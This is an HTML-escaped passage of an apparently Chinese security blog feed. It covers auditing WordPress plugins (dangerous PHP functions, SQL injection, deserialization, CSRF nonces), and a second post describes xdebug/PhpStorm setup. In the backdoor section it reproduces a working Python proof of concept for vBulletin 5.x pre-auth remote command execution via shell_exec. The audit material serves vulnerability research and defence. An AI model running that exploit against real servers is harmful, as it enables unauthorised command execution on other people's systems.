&lt;p&gt;这种情况下就只有直接replace特殊符号为空了，不过也算小概率事件，一般在富文本渲染和留言处多见。&lt;/p&gt;

&lt;h4 id=&quot;响应格式不明&quot;&gt;响应格式不明&lt;/h4&gt;

&lt;p&gt;另外，在没有选项参数的情况下使用json_encode函数，会导致PHP不会转义其他字符（参见JSON_HEX_TAG）。因此，我们可以将任意HTML注入到响应中，但是没有浏览器会在JSON响应中评估HTML吗？好吧，只有当您的JSON响应告诉浏览器它实际上就是JSON的时候才会评估，示例见：
&lt;a href=&quot;https://xz.aliyun.com/t/2643&quot;&gt;json_encode&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function evomdt_ajax(){
  if(empty($_POST['type'])) return;

  $type = $_POST['type'];
  $output = '';

  switch($type){
  case 'newform':
    echo json_encode(array(
      'content' =&amp;gt;$this-&amp;gt;mdt_form($_POST['eventid'], $_POST['tax']),
      'status'=&amp;gt;'good'
    )); exit;
  break;
  case 'editform':
    echo json_encode(array(
      'content' =&amp;gt;$this-&amp;gt;mdt_form($_POST['eventid'], $_POST['tax'],$_POST['termid'] ),
      'status'=&amp;gt;'good'
    )); exit;
  break;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;响应格式为text/html，而不是application/json：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
[...]
Content-Type: text/html; charset=UTF-8

{&quot;content&quot;:[...]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;sql注入&quot;&gt;SQL注入&lt;/h3&gt;

&lt;p&gt;下面是wordpress自带的不安全的sql查询关键词，需要我们单独去调用过滤函数：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;$wpdb-&amp;gt;query()&lt;/li&gt;
  &lt;li&gt;$wpdb-&amp;gt;get_var()&lt;/li&gt;
  &lt;li&gt;$wpdb-&amp;gt;get_row()&lt;/li&gt;
  &lt;li&gt;$wpdb-&amp;gt;get_col()&lt;/li&gt;
  &lt;li&gt;$wpdb-&amp;gt;get_results()&lt;/li&gt;
  &lt;li&gt;$wpdb-&amp;gt;replace()&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;安全的sql函数：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;$wpdb-&amp;gt;insert()&lt;/li&gt;
  &lt;li&gt;$wpdb-&amp;gt;update()&lt;/li&gt;
  &lt;li&gt;$wpdb-&amp;gt;delete()&lt;/li&gt;
  &lt;li&gt;$wpdb-&amp;gt;prepare()&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在wordpressv3.5以前，可以直接拼接传入语句，容易出现SQL注入漏洞：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$wpdb-&amp;gt;query( $wpdb-&amp;gt;prepare( &quot;INSERT INTO table (user, pass) VALUES ('$user', '$pass')&quot; ) );
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;现在新版的wordpress里面声明就友好多了，需要占位符依次传入参数：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php $sql = $wpdb-&amp;gt;prepare( 'query' , value_parameter[, value_parameter ... ] ); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;下面的函数挺好用，但这里的转义只会转义特殊字符，对于order by和未用单引号闭合的参数是不能预防的。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;esc_sql()&lt;/li&gt;
  &lt;li&gt;escape()&lt;/li&gt;
  &lt;li&gt;esc_like()&lt;/li&gt;
  &lt;li&gt;like_escape()&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;$wpdb-&amp;gt;prepare()真香系列。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;官方的说法是：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;In 99% of cases, you can use $wpdb-&amp;gt;prepare() instead, and that is the recommended method.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;This function is only for use in those rare cases where you can’t easily use $wpdb-&amp;gt;prepare().&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;One example is preparing an array for use in an IN clause.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;注意，新版wordpress会自动将$_GET$_POST$_COOKIE$_SERVER中的值，使用add_magic_quotes方法进行过滤。&lt;/p&gt;

&lt;p&gt;但值得一提的是，随后，将过滤后的GET与POST数组合并后覆盖$_REQUEST。在以往一些安全性不高的程序中，往往会出现，过滤了GET与POST，却忘记过滤REQUEST的情况，导致漏洞的产生。&lt;/p&gt;

&lt;p&gt;另外，在传入数组时，wordpress不会对数组成员进行add_magic_quotes转义。&lt;/p&gt;

&lt;p&gt;另外，WordPress除了强制向输入内容添加斜杠外，它还提供了几个内置的过滤函数，用于清理用户输入和保护内容输出。&lt;/p&gt;

&lt;p&gt;下面的屏蔽SQL错误，虽然不防延时注入（手动滑稽）：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php $wpdb-&amp;gt;show_errors(); ?&amp;gt; 
&amp;lt;?php $wpdb-&amp;gt;hide_errors(); ?&amp;gt; 
&amp;lt;?php $wpdb-&amp;gt;print_error(); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;任意文件下载&quot;&gt;任意文件下载&lt;/h3&gt;

&lt;p&gt;可疑函数，雷同于普通审计：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;file()&lt;/li&gt;
  &lt;li&gt;readfile()&lt;/li&gt;
  &lt;li&gt;file_get_contents()&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;文件包含&quot;&gt;文件包含&lt;/h3&gt;

&lt;p&gt;可疑函数，雷同于普通审计：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;include()&lt;/li&gt;
  &lt;li&gt;require()&lt;/li&gt;
  &lt;li&gt;include_once()&lt;/li&gt;
  &lt;li&gt;require_once()&lt;/li&gt;
  &lt;li&gt;fread()&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;文件删除&quot;&gt;文件删除&lt;/h3&gt;

&lt;p&gt;可疑函数，雷同于普通审计：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unlink() 任意删除文件
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;文件上传&quot;&gt;文件上传&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sanitize_file_name() 可以创建有效的php文件, 把test.(php)转为test.php
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;一般情况下，wordpress自带的编辑器上传一般是做了校验的，如果不是的话，可以尝试fuzz一下。
另外，在超管权限下是可以直接编辑模板拿shell或者传插件的，这个需要在服务器上配置限制修改和上传的权限。&lt;/p&gt;

&lt;h3 id=&quot;反序列化漏洞&quot;&gt;反序列化漏洞&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;unserialize() any raw user input passed to this function is probably exploitable, if serialized() first, probably not vulnerable&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;一般来说，利用PHP的反序列化漏洞，一般要注意几点：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;phar文件要能够上传到服务器端。&lt;/li&gt;
  &lt;li&gt;要有可用的魔术方法作为“跳板”。&lt;/li&gt;
  &lt;li&gt;文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。&lt;/li&gt;
  &lt;li&gt;输入参数值反序列化后，其本身的结果，可以直接触发提权动作。&lt;/li&gt;
  &lt;li&gt;一般主分支难以找到反序列化利用点，所以要尝试在插件的类去找可以利用的魔术方法。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;具体可以参考：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://paper.seebug.org/680/#32-wordpress&quot;&gt;利用 phar 拓展 php 反序列化漏洞攻击面【wordpress】&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.freebuf.com/vuls/198913.html&quot;&gt; WordPress插件Easy WP SMTP反序列化漏洞分析&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;插件辅助判断&quot;&gt;插件辅助判断&lt;/h3&gt;

&lt;p&gt;在反序列化之前先进行序列化，会有一定的防治作用，有款wordpress插件提供可反序列化的类，和配套的burp插件可以验证漏洞的存在：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.pluginvulnerabilities.com/2017/07/24/wordpress-plugin-for-use-in-testing-for-php-object-injection/&quot;&gt;wordpress插件分析&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.pluginvulnerabilities.com/wp-content/uploads/2017/07/php-object-injection-test.zip&quot;&gt;wordpress插件下载&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://gist.github.com/ethicalhack3r/7c2618e5fffd564e2734e281c86a2c9b&quot;&gt;配套burp插件&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;大致核心代码如下，稍微解释下，类的__wakeup()方法（*PHP“魔术方法”，unserialize()函数会检查是否存在__wakeup()，如果存在，则会先调用__wakeup()方法，预先准备对象需要的资源），如果一个类定义了__wakeup()方法，那么无论何时该类的某个对象使用了unserialize()函数进行反序列化都能保证__wakeup()方法一定被调用：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?

class PHP_Object_Injection {
   function __wakeup() {
		exit('PHP object injection has occurred.');
   }
}

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;burp插件在检测到关键词时（PHP object…occurred）,会提示检测到漏洞。&lt;/p&gt;

&lt;h3 id=&quot;命令执行&quot;&gt;命令执行&lt;/h3&gt;

&lt;p&gt;可疑函数，雷同于普通审计：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;system()&lt;/li&gt;
  &lt;li&gt;exec()&lt;/li&gt;
  &lt;li&gt;passthru()&lt;/li&gt;
  &lt;li&gt;shell_exec()&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;代码执行&quot;&gt;代码执行&lt;/h3&gt;

&lt;p&gt;可疑函数，雷同于普通审计：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;eval()&lt;/li&gt;
  &lt;li&gt;assert()&lt;/li&gt;
  &lt;li&gt;preg_replace() dangerous “e” flag deprecated since PHP &amp;gt;= 5.5.0 and removed in PHP &amp;gt;= 7.0.0.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;任意url跳转&quot;&gt;任意url跳转&lt;/h3&gt;

&lt;p&gt;系统自带的跳转函数，本身没做检查，需要插件作者自行做过滤，否则会存在任意url跳转的风险。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wp_redirect()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;csrf利用nonce&quot;&gt;CSRF（利用nonce）&lt;/h3&gt;

&lt;p&gt;在wordpress中，主要用自带的nonce作为token来防治csrf，当然也有过插件作者自造token的。&lt;/p&gt;

&lt;p&gt;另外值得一提的是，wordpress的评论机制似乎对csrf没有防御。&lt;/p&gt;

&lt;p&gt;在nonce检查中，不是每一步都检查权限的。实际代码跨越了多个文件和函数调用，因此这个过程很容易出现这种缺陷，示例见：
&lt;a href=&quot;https://xz.aliyun.com/t/3659&quot;&gt;WordPress权限提升漏洞分析
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;下面是对csrf攻击的防御：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;wp_nonce_field() csrf token加入表单&lt;/li&gt;
  &lt;li&gt;wp_nonce_url() csrf token加入url&lt;/li&gt;
  &lt;li&gt;wp_verify_nonce() 服务端需要验证csrf token&lt;/li&gt;
  &lt;li&gt;check_admin_referer() server端检查是否来自admin权限页面【笔者觉得比较鸡肋】&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;另外，有人提过nonce可以抑制SSRF的产生。&lt;/p&gt;

&lt;h3 id=&quot;wordpress权限认证绕过&quot;&gt;wordpress权限认证绕过&lt;/h3&gt;

&lt;p&gt;由于WordPress中的AJAX动作是通过wp-admin/admin-ajax.php文件访问的，所以is_admin()总是返回true。&lt;/p&gt;

&lt;p&gt;官方说法：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Whether the current request is for an administrative interface page. […] Does not check if the user is an administrator; current_user_can() for checking roles and capabilities.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;可用攻击向量&quot;&gt;可用攻击向量&lt;/h3&gt;

&lt;p&gt;下面的函数本来是无害的，它们一般会用于构造利用链，做wordpress权限提升。如果没有过滤完全，会比单纯输出打印内容更富有威胁性。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;update_option() 输入未严格验证的时候，可能会触发wordpress的option的更新。&lt;/li&gt;
  &lt;li&gt;do_action() 输入未严格验证的时候，会触发wordpress代码执行。&lt;/li&gt;
  &lt;li&gt;add_action 触发函数钩子。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;第三方信任源和自带后门&quot;&gt;第三方信任源和自带后门&lt;/h3&gt;

&lt;p&gt;第三方信任源的问题，主要可能是对第三方网站内容的加载，没有进行合适过滤。&lt;/p&gt;

&lt;p&gt;而插件自带后门，可能会存在硬编码，或者缺少权限验证/权限混乱的问题。通过审计代码，黑客可以直接获取网站权限。比如最近vBulletin 5.x的rce【这里没有现成的wp插件举例，大家将就下】：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Usage: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;lt;URL to vBulletin&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;routestring&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ajax/render/widget_php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;vBulletin$ &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;widgetConfig[code]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;echo shell_exec('&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;'); exit;&quot;&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status_code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
               &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
               &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Exploit failed! :(&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;KeyboardInterrupt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Closing shell...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;从poc来看，这里的利用方式是不需要认证的，直接通过post参数组，传入恶意代码，即可执行命令。
对于这个后门是否为官方故意所为，笔者不好下定论，但这种漏洞确实不少见。
早些年笔者挖掘cve时就曾遇到过，那还是个有几十万用户量的wordpress插件。&lt;/p&gt;

&lt;h3 id=&quot;后记&quot;&gt;后记&lt;/h3&gt;

&lt;p&gt;对于cve漏洞挖掘，还是需要耐心和细心的。毕竟流程复杂的漏洞不好挖，简单的漏洞大部分被人挖过了，尤其是被人怼了个通透的大型开源CMS。&lt;/p&gt;

&lt;p&gt;一般白盒和黑盒挖掘需要结合，Fuzz和审计都是有用的。&lt;/p&gt;

&lt;p&gt;通过分析语法树，以及动态hook的法子，也越来越被推广使用。&lt;/p&gt;

&lt;p&gt;举例说，如果尝试梳理长语法树和调用链，无论是注重深度还是注重广度，一般都需要较高内存机器去跑，说实话耗费资源是不低的。&lt;/p&gt;

&lt;p&gt;而一旦这块儿做好了以后，就算我们不一定能主动发现新漏洞。但除了漏洞公告后，我们通过调用链回溯diff出来的点，一般我们都能很快地去定位到可用的漏洞利用链，说不定还有意外惊喜。&lt;/p&gt;

&lt;h3 id=&quot;文章参考&quot;&gt;文章参考&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/WordPress/WordPress-Coding-Standards&quot;&gt;wordpress编码标准&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.fortinet.com/blog/threat-research/wordpress-plugin-sql-injection-vulnerability.html&quot;&gt;Multiple WordPress Plugins SQL Injection Vulnerabilities&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/4438&quot;&gt;评论处wp_filter_post_kses过滤不全&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/6395&quot;&gt;渲染导致的HTML实体编码失效&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2643&quot;&gt;使用grep检查wp-sec&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/1482&quot;&gt;$wpdb-&amp;gt;prepare的修复和正确使用&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2150&quot;&gt;PHP反序列化与Wordpress一些意外Bug的有趣结合&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/ethicalhack3r/wordpress_plugin_security_testing_cheat_sheet&quot;&gt;wordpress插件安全文档&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>HellSec</name></author><category term="vuln" /><summary type="html">一般出名点的开源软件，比如wordpress的核心高危漏洞是比较难挖的。但其附属的高用户量的插件漏洞也是具有一定的价值的，而挖掘起来相对容易些，这里就来简单谈谈wordpress插件漏洞的挖掘和修复。</summary></entry><entry><title type="html">xdebug+phpstorm+phpstudy本地调试踩坑</title><link href="http://localhost:4000/vuln/2019/10/10/xdebug-phpstorm-phpstudy/" rel="alternate" type="text/html" title="xdebug+phpstorm+phpstudy本地调试踩坑" /><published>2019-10-10T21:13:00+08:00</published><updated>2019-10-10T21:13:00+08:00</updated><id>http://localhost:4000/vuln/2019/10/10/xdebug-phpstorm-phpstudy</id><content type="html" xml:base="http://localhost:4000/vuln/2019/10/10/xdebug-phpstorm-phpstudy/">&lt;p&gt;
	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;这两天用idea审java比较顺手，顺便也迁移了下php调试环境，从vscode迁移到jetbrains家的phpstorm。以前习惯了纯搜索字符串，通过打印调试，没有动态hook变量看起来比较费劲。迁移过程中遇到一些坑，故此记录一下。
&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;h3 id=&quot;phpstorm配置&quot;&gt;phpstorm配置&lt;/h3&gt;

&lt;p&gt;先贴下我自己的php.ini配置【XDebug部分】：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[XDebug]
xdebug.profiler_output_dir=&quot;D:\phpstudy_pro\Extensions\tmp\xdebug&quot;
xdebug.trace_output_dir=&quot;D:\phpstudy_pro\Extensions\tmp\xdebug&quot;
zend_extension=&quot;D:\phpstudy_pro\Extensions\php\php_xdebug-2.2.5-5.6-vc11-nts-x86_64.dll&quot;
xdebug.remote_port = 9000
xdebug.remote_autostart= On
xdebug.remote_enable = On
xdebug.idekey = phpstorm-xdebug
xdebug.remote_handler = &quot;dbgp&quot;
xdebug.remote_host = &quot;127.0.0.1&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h3 id=&quot;前人踩坑总结&quot;&gt;前人踩坑总结&lt;/h3&gt;

&lt;p&gt;中间遇到一个坑，网上大部分配置操作都照做了。&lt;/p&gt;

&lt;p&gt;这里着重讲几个重要的配置，跟下面网上扒拉的图不大一致【由于没找到合适的图床，暂时只能引用网上的】：&lt;/p&gt;

&lt;p&gt;顶栏点击File-&amp;gt;Settings，搜索框输入debug，ideakey是我自己设置的&lt;strong&gt;phpstorm-xdebug&lt;/strong&gt;：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://www.pianshen.com/images/875/e473bbd1c2ba3874beb5b2c1be586e3b.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;下图是网图，我设置的是&lt;strong&gt;9000&lt;/strong&gt;：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://www.pianshen.com/images/213/403b3aca2b50f4b3529c098af21b19f5.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;因为是本地映射调试，下面网图的Use path mappings不要勾选，但填不填域名关系不大，我自己填的&lt;strong&gt;127.0.0.1&lt;/strong&gt;：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://www.pianshen.com/images/497/bcad8b94b1ec8f582f0d14a176a0f439.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;注意，最新版的phpstorm下面不是web application，而是&lt;strong&gt;web page&lt;/strong&gt;：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://static.oschina.net/uploads/space/2014/1128/150910_uD44_174025.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;设置cli-interpreter&quot;&gt;设置CLI Interpreter&lt;/h3&gt;

&lt;p&gt;设置链路为：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Settings-&amp;gt;Languages&amp;amp;Frameworks-&amp;gt;PHP
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;设置为你引用的php.exe绝对路径即可，另外该页面的Include Path按默认的就好。&lt;/p&gt;

&lt;h3 id=&quot;文件映射map报错可以看变量无法跟踪文件&quot;&gt;文件映射map报错，可以看变量，无法跟踪文件&lt;/h3&gt;

&lt;p&gt;记得在调试variables的时候，映射本地路径的时候，会要求&lt;strong&gt;做文件夹路径映射&lt;/strong&gt;，否则会报错，提示map错误，无法定位跟踪需要调试的文件。&lt;/p&gt;

